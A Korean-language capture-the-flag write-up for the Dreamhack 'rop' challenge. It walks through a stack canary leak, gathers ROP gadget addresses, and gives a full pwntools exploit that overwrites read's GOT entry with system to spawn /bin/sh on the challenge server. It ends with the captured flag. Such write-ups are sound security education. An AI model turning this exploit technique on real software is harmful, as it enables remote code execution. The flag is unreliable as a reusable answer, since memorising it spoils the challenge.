<!DOCTYPE html>
<html>
<head>
    <link rel="stylesheet" type="text/css" href="style.css">
</head>
<body>
    <h1> Dreamhack "rop"  Write-UP</h1>
</body>
<br>
<br>
</html>

2025.09.29 풀이

<img width="1280" height="197" alt="image" src="https://github.com/user-attachments/assets/320b7a13-d273-4759-8a3e-d2a43d892b06" />

일단 제공받은 elf를 checksec로 확인해보았다. 보니, NX가 적용되어 있고, 카나리도 적용된 것을 알 수 있다.

<br>

</br> 

<img width="704" height="780" alt="image" src="https://github.com/user-attachments/assets/61e69878-9809-43fe-8763-5f711212baa2" />

이는 해당 문제 코드인데, setvbuf로 stdio 버퍼링을 차단하고 buf에 먼저 입력을 받아 printf로 

카나리를 유출하는 코드처럼 보인다. 그 후, 입력값을 buf로 읽어들이는 것처럼 보인다.

buf 크기는 0x30인데, read 함수로 0x100 정도를 입력받게 하여 오버플로우를 유발하여 

카나리를 얻는 것으로 보인다. 

<br>

</br> 

<img width="1222" height="1310" alt="image" src="https://github.com/user-attachments/assets/bf3ff2d9-d527-4731-b54a-aca544752e69" />

해당 main 함수를 어셈블리 해보니, rbp-0x40 부분을 통해, buf의 크기는 0x40으로 주어져 있는데,

카나리가 포함되어 있기 때문에 실제는 0x38인 것으로 추측해보았다.

이와 더불어 위에 checksec 부분에서도 Partial RELRO라고 되어 있는 것을 보아

GOT을 활용하여서 익스플로잇을 코드를 짜면 되지 않을까 생각하였다. 

<br>

</br> 

<img width="1214" height="92" alt="image" src="https://github.com/user-attachments/assets/40094b00-93cd-4e89-9525-97c5553fc2d7" />

<img width="1180" height="806" alt="image" src="https://github.com/user-attachments/assets/7b3b1b6f-0c7d-4aab-a726-ac547e6bcec4" />

익스플로잇 코드를 작성할 때 필요한 가젯 주소를 구해보았다.

pop rdi 가젯 주소는 0x400853, pop rsi r15 가젯 주소는 0x400851,

ret 가젯의 주소는 0x400596 것을 알아내었다.

<br>

</br> 

```
from pwn import *

context(arch='amd64', os='linux')

p = remote('host1.dreamhack.games', 10626)
e = ELF('./rop')
libc = ELF('./libc.so.6')

read_plt = e.plt['read']
read_got = e.got['read']
write_plt = e.plt['write']
write_got = e.got['write']

pop_rdi = 0x400853
pop_rsi_r15 = 0x400851
ret = 0x400596

buf1 = b'A' * 0x39
p.sendafter('Buf: ', buf1)

p.recvuntil(buf1)
canary = u64(b'\x00' + p.recvn(7))
log.info(f'canary : {hex(canary)}')

payload = b'A' * 0x38
payload += p64(canary)
payload += b'A' * 0x8

payload += p64(pop_rdi)
payload += p64(1)
payload += p64(pop_rsi_r15)
payload += p64(read_got)
payload += p64(0)
payload += p64(write_plt)

payload += p64(pop_rdi)
payload += p64(0)
payload += p64(pop_rsi_r15)
payload += p64(read_got)
payload += p64(0)
payload += p64(read_plt)

payload += p64(pop_rdi)
payload += p64(read_got + 0x8)
payload += p64(ret)
payload += p64(read_plt)

p.sendafter('Buf: ', payload)

read_addr = u64(p.recvn(8))
libc_base = read_addr - libc.symbols['read']
log.info(f'read : {hex(read_addr)}')

system = libc_base + libc.symbols['system']
log.info(f'system : {hex(system)}')

p.send(p64(system) + b'/bin/sh\x00')

p.interactive()
```

카나리를 빼내 복원하여, 스택 보호를 우회하고, ROP로 write 함수를 사용해

read의 GOT 엔트리를 알아내 libc 베이스를 계산한 뒤, system 주소로 덮어씌우는 코드를 작성해보았다.

덮어쓴 read를 호출해서 /bin/sh를 얻어낼 수 있다.

<br>

</br> 

<img width="1280" height="637" alt="image" src="https://github.com/user-attachments/assets/554592cf-e399-4dfa-816d-241936887f70" />

해당 코드를 실행해보니, 플래그 값을 얻을 수 있었다.

<br>

</br> 

```
DH{8056b333681caa09d67d1d7aa48a3586ef867de0ac3b778c9839d449d4fcb0cf}
```
